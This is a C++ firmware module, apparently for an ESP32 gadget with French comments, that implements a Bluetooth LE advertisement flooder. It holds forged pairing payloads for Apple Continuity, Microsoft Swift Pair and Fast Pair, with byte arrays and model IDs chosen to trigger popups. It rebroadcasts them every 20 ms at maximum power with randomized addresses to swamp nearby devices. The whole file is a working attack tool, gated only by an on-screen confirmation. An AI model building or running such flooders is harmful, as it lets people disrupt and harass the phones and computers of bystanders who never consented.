// ---------------------------------------------------------------------------
//  blespam.cpp — flood d'annonces BLE (clean-room, via NimBLE).
//
//  Réimplémentation clean-room (aucun code ESP-HACK). Construit des charges
//  d'annonce propres à chaque écosystème (Apple Continuity, Microsoft Swift
//  Pair, Samsung/Google Fast Pair) et les diffuse en boucle avec une adresse
//  aléatoire à chaque itération. Gaté avant émission.
//
//  Dépend de NimBLE-Arduino (déclaré dans platformio.ini). À valider sur la
//  carte : le comportement d'appairage varie selon la cible et la version OS.
// ---------------------------------------------------------------------------
#include "config.h"
#include "theme.h"
#include "authgate.h"
#include "blespam.h"
#include <NimBLEDevice.h>

namespace BleSpam {

static bool running = false;
static uint32_t bursts = 0;
static int mode = 0;  // 0 Apple, 1 Microsoft, 2 Fast Pair, 3 aléatoire

static const char *MODE_NAME[] = {"Apple", "Swift Pair", "Fast Pair", "Random"};
static const int MODE_COUNT = 4;

// --- Constructeurs de charge utile ------------------------------------------
// Apple Continuity : manufacturer data 0x004C, sous-type "proximity pairing".
static std::string payloadApple() {
    uint8_t d[] = {
        0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07,
        (uint8_t)(random(256)),                 // device model (varie le popup)
        0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45,
        (uint8_t)random(256), (uint8_t)random(256), (uint8_t)random(256),
        0x00, 0x00, 0x00, 0x00,
        (uint8_t)random(256), (uint8_t)random(256), (uint8_t)random(256),
        (uint8_t)random(256), (uint8_t)random(256), (uint8_t)random(256),
        (uint8_t)random(256), (uint8_t)random(256),
    };
    return std::string((char *)d, sizeof(d));
}

// Microsoft Swift Pair : manufacturer data 0x0006.
static std::string payloadSwiftPair() {
    uint8_t d[] = {
        0x0A, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80,
        (uint8_t)random(256), (uint8_t)random(256), (uint8_t)random(256),
        (uint8_t)random(256),
    };
    return std::string((char *)d, sizeof(d));
}

// Google/Samsung Fast Pair : service data 0xFE2C + model id sur 3 octets.
static std::string payloadFastPair() {
    // Quelques model id qui déclenchent un popup ; on en choisit un au hasard.
    static const uint32_t models[] = {0xCD8256, 0x000006, 0x02AA91, 0xF52494};
    uint32_t m = models[random(sizeof(models) / sizeof(models[0]))];
    uint8_t d[] = {
        0x03, 0x03, 0x2C, 0xFE,
        0x06, 0x16, 0x2C, 0xFE,
        (uint8_t)(m >> 16), (uint8_t)(m >> 8), (uint8_t)m,
    };
    return std::string((char *)d, sizeof(d));
}

static void randomizeAddress() {
    // Adresse d'annonce aléatoire. On reste sur l'API haut niveau NimBLE
    // (setOwnAddrType) pour ne pas dépendre d'un en-tête host bas niveau.
    // NB : une rotation d'adresse à chaque burst passe par ble_hs_id_set_rnd()
    // (host NimBLE) — à ajouter/valider sur la carte si nécessaire.
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
}

static void advertiseOnce() {
    int m = (mode == 3) ? random(3) : mode;
    std::string payload =
        (m == 0) ? payloadApple() : (m == 1) ? payloadSwiftPair() : payloadFastPair();

    NimBLEAdvertising *adv = NimBLEDevice::getAdvertising();
    adv->stop();
    randomizeAddress();
    NimBLEAdvertisementData data;
    data.addData(payload);
    adv->setAdvertisementData(data);
    adv->start();
    bursts++;
}

static void drawStatus() {
    u8g2.clearBuffer();
    gbHeader("BLE Spam");
    u8g2.setFont(u8g2_font_5x8_tr);
    char buf[26];
    snprintf(buf, sizeof(buf), "Target: %s", MODE_NAME[mode]);
    u8g2.drawStr(0, 24, buf);
    u8g2.drawStr(0, 34, running ? "Status: SPAMMING" : "Status: idle");
    snprintf(buf, sizeof(buf), "Bursts: %lu", (unsigned long)bursts);
    u8g2.drawStr(0, 44, buf);
    u8g2.drawStr(0, 63, running ? "RIGHT stop  U/D none" : "RIGHT start  U/D target");
    u8g2.sendBuffer();
    setNeoPixelColour(running ? "attack" : "0");
}

void setup() {
    running = false;
    bursts = 0;
    mode = 0;
    NimBLEDevice::init("");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    drawStatus();
}

bool loop() {
    // Choix de la cible (à l'arrêt seulement).
    if (!running && digitalRead(BUTTON_UP_PIN) == LOW) {
        while (digitalRead(BUTTON_UP_PIN) == LOW);
        mode = (mode + 1) % MODE_COUNT;
        drawStatus();
    } else if (!running && digitalRead(BUTTON_DOWN_PIN) == LOW) {
        while (digitalRead(BUTTON_DOWN_PIN) == LOW);
        mode = (mode - 1 + MODE_COUNT) % MODE_COUNT;
        drawStatus();
    }

    if (digitalRead(BTN_PIN_RIGHT) == LOW) {
        while (digitalRead(BTN_PIN_RIGHT) == LOW);
        if (running) {
            running = false;
            NimBLEDevice::getAdvertising()->stop();
        } else if (AuthGate::confirm("BLE Spam", "Floods BLE pairing", "popups nearby.")) {
            running = true;
        }
        drawStatus();
    }

    if (digitalRead(BTN_PIN_LEFT) == LOW) {
        while (digitalRead(BTN_PIN_LEFT) == LOW);
        if (running) NimBLEDevice::getAdvertising()->stop();
        running = false;
        setNeoPixelColour("0");
        return true;
    }

    if (running) {
        advertiseOnce();
        delay(20);   // cadence d'annonce
        static unsigned long lastDraw = 0;
        if (millis() - lastDraw > 500) { drawStatus(); lastDraw = millis(); }
    }
    return false;
}

}  // namespace BleSpam
